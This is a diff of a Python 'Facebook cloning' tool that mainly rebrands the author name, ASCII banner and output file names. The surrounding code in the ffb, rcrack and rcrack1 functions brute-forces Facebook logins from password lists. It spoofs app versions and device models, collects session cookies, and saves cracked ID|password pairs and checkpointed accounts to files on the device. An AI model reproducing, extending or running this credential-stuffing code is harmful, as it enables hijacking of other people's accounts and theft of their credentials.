@@ -106,21 +106,21 @@ def uaku():
 	 
 
 logo=("""\033[1;32m
-                     
-███╗   ██╗ █████╗ ███████╗██╗██████╗ 
-████╗  ██║██╔══██╗██╔════╝██║██╔══██╗
-██╔██╗ ██║███████║███████╗██║██████╔╝
-██║╚██╗██║██╔══██║╚════██║██║██╔══██╗
-██║ ╚████║██║  ██║███████║██║██║  ██║
-╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝╚═╝╚═╝  ╚═╝
+
+███████╗██╗   ██╗███╗   ██╗███████╗██████╗  █████╗     
+╚══███╔╝██║   ██║████╗  ██║██╔════╝██╔══██╗██╔══██╗    
+  ███╔╝ ██║   ██║██╔██╗ ██║█████╗  ██████╔╝███████║    
+ ███╔╝  ██║   ██║██║╚██╗██║██╔══╝  ██╔══██╗██╔══██║    
+███████╗╚██████╔╝██║ ╚████║███████╗██║  ██║██║  ██║    
+╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ 
 \033[1;32m--------------------------------------------------
-{+}\033[1;32mCREATED BY     : \033[1;32mNASIR \033[1;32m
-{+}\033[1;32mFACEBOOK       : \033[1;32mAbdul Nasir.869\033[1;32m
+{+}\033[1;32mCREATED BY     : \033[1;32mZunera \033[1;32m
+{+}\033[1;32mFACEBOOK       : \033[1;32mZunera khan.869\033[1;32m
 {+}\033[1;32mYOUTUBE        : \033[1;32mNO YT\033[1;32m
 {+}\033[1;32mVERSION        :\033[1;32m 11.0\033[1;32m
 {+}\033[1;32mSTATUS         :\033[1;32m FREE\033[1;32m
 --------------------------------------------------
-\033[1;37m[-]KING MR Nasir
+\033[1;37m[-]Queen Zunera
 --------------------------------------------------""")
 def linex():
 	print('\033[1;32m--------------------------------------------------')
@@ -716,7 +716,7 @@ def gmail():
 
 def ffb(ids,names,passlist):
 	global loop,oks,cps
-	sys.stdout.write('\r\r\033[1;32m [XEE %s|\033[1;32mOK:-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
+	sys.stdout.write('\r\r\033[1;32m [Zunii %s|\033[1;32mOK:-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
 	session = requests.Session()
 	try:
 		first = names.split(' ')[0]
@@ -737,14 +737,14 @@ def ffb(ids,names,passlist):
 			if "c_user" in AXI:
 				coki=session.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-				print('\r\r\033[1;32m [NASIR-OK] %s | %s'%(ids,pas))
-				open('/sdcard/NASIR-OK.txt', 'a').write(ids+'|'+pas+'\n')
+				print('\r\r\033[1;32m [ZUNERA-OK] %s | %s'%(ids,pas))
+				open('/sdcard/ZUNERA-OK.txt', 'a').write(ids+'|'+pas+'\n')
 				oks.append(ids)
 				break
 			elif 'checkpoint' in AXI:
 				if 'y' in pcp:
-					print('\r\r\x1b[38;5;208m[NASIR-CP] '+ids+' | '+pas+'\033[1;97m')
-					open('/sdcard/NASIR-CP.txt', 'a').write(ids+'|'+pas+'\n')
+					print('\r\r\x1b[38;5;208m[ZUNERA-CP] '+ids+' | '+pas+'\033[1;97m')
+					open('/sdcard/ZUNERA-CP.txt', 'a').write(ids+'|'+pas+'\n')
 					cps.append(ids)
 					break
 				else:
@@ -760,7 +760,7 @@ def rcrack1(ids,passlist):
 	global oks
 	try:
 		for pas in passlist:
-			sys.stdout.write('\r\r\033[1;32m[XEE %s|\033[1;32mOK:-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
+			sys.stdout.write('\r\r\033[1;32m[Zunii %s|\033[1;32mOK:-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
 			application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
 			application_version_code=str(random.randint(000000000,999999999))
 			__iam_genius = random.choice(android_models)
@@ -809,13 +809,13 @@ def rcrack1(ids,passlist):
 			q = json.loads(po)
 			if 'session_key' in q:
 				udx = str(q['uid'])
-				print('\r\r\033[1;32m [NASIR-OK] '+udx+' | '+pas+'\033[1;97m')
-				open('/sdcard/NASIR-OK.txt', 'a').write(udx+'|'+pas+'\n')
+				print('\r\r\033[1;32m [ZUNERA-OK] '+udx+' | '+pas+'\033[1;97m')
+				open('/sdcard/ZUNERA-OK.txt', 'a').write(udx+'|'+pas+'\n')
 				oks.append(ids)
 				break
 			elif 'www.facebook.com' in q['error_msg']:
-				print('\r\r\x1b[38;5;208m [NASIR-CP] '+ids+' | '+pas+'\033[1;97m')
-				open('/sdcard/NASIR-CP.txt','a').write(ids+'|'+pas+'\n')
+				print('\r\r\x1b[38;5;208m [ZUNERA-CP] '+ids+' | '+pas+'\033[1;97m')
+				open('/sdcard/ZUNERA-CP.txt','a').write(ids+'|'+pas+'\n')
 				cps.append(ids)
 				break
 			else:
@@ -830,7 +830,7 @@ def rcrack(ids,passlist):
 	global oks
 	try:
 		for pas in passlist:
-			sys.stdout.write('\r\r\033[1;32m [XEE %s|\033[1;32mOK:-%s \033[1;91m'%(loop,len(oks)));sys.stdout.flush()
+			sys.stdout.write('\r\r\033[1;32m [Zunii %s|\033[1;32mOK:-%s \033[1;91m'%(loop,len(oks)));sys.stdout.flush()
 			session = requests.Session()
 			pro = random.choice(ugen)
 			free_fb = session.get('https://free.facebook.com').text
@@ -872,9 +872,9 @@ def rcrack(ids,passlist):
 					if 'checkpoint' in str(lo):
 						print('\r\r\033[1;34m [MSS-TL] '+ids+' | '+pas)
 					else:
-						print(f'\r\x1b[1;32m [NASIR-OK] '+ids+' | '+pas)
+						print(f'\r\x1b[1;32m [ZUNERA-OK] '+ids+' | '+pas)
 						cek_apk(session,coki)
-						open('/sdcard/NASIR-OK.txt', 'a').write(ids+'|'+pas+'\n')
+						open('/sdcard/ZUNERA-OK.txt', 'a').write(ids+'|'+pas+'\n')
 						oks.append(uid)
 						break
 			elif 'checkpoint' in log_cookies:
@@ -882,8 +882,8 @@ def rcrack(ids,passlist):
 				uid = coki[24:39]
 				if uid in cps:pass
 				else:
-					print('\r\r\x1b[38;5;208m [NASIR-CP] '+ids+' | '+pas+'\033[1;97m')
-					open('/sdcard/NASIR-CP.txt', 'a').write(ids+'|'+pas+'\n')
+					print('\r\r\x1b[38;5;208m [ZUNERA-CP] '+ids+' | '+pas+'\033[1;97m')
+					open('/sdcard/ZUNERA-CP.txt', 'a').write(ids+'|'+pas+'\n')
 					cps.append(ids)
 					break
 			else:
@@ -903,16 +903,16 @@ def menu_apikey():
 
   os.system(" clear")                          
   print("""\033[1;32m
-            
-███╗   ██╗ █████╗ ███████╗██╗██████╗ 
-████╗  ██║██╔══██╗██╔════╝██║██╔══██╗
-██╔██╗ ██║███████║███████╗██║██████╔╝
-██║╚██╗██║██╔══██║╚════██║██║██╔══██╗
-██║ ╚████║██║  ██║███████║██║██║  ██║
-╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝╚═╝╚═╝  ╚═╝ 
+
+███████╗██╗   ██╗███╗   ██╗███████╗██████╗  █████╗     
+╚══███╔╝██║   ██║████╗  ██║██╔════╝██╔══██╗██╔══██╗    
+  ███╔╝ ██║   ██║██╔██╗ ██║█████╗  ██████╔╝███████║    
+ ███╔╝  ██║   ██║██║╚██╗██║██╔══╝  ██╔══██╗██╔══██║    
+███████╗╚██████╔╝██║ ╚████║███████╗██║  ██║██║  ██║    
+╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ 
 \033[1;92m--------------------------------------------------
-{+}\033[1;32mCREATED BY     : \033[1;32mNASIR 🖕🖕N\033[1;32m
-(+}\033[1;32mFACEBOOK       : \033[1;32mAbdul Nasir869 \033[1;32m
+{+}\033[1;32mCREATED BY     : \033[1;32mZunera 🖕🖕N\033[1;32m
+(+}\033[1;32mFACEBOOK       : \033[1;32mZunera khan869 \033[1;32m
 {+}\033[1;32mYOUTUBE        : \033[1;32mA♥️\033N[1;32m
 {+}\033[1;32mVERSION        :\033[1;32m 11.0\033[1;32m
 {+}\033[1;32mSTATUS         :\033[1;32m PRIVATE\033[1;32m
@@ -920,7 +920,7 @@ def menu_apikey():
 \033[1;33m[+]TOOLS  : FACEBOOK CLONING 
 \033[1;37m[+]Status : PRIVATE
 ==================================================
- \33[37;41m\t IF YOU ARE FREE USER THEN GO TO XEE\33[0;m
+ \33[37;41m\t IF YOU ARE FREE USER THEN GO TO Zunii\33[0;m
 \033[1;93m=================================================
  \033[1;35m[*]First read NOTE:
  \033[1;37m[1]if facebook go on update you get not
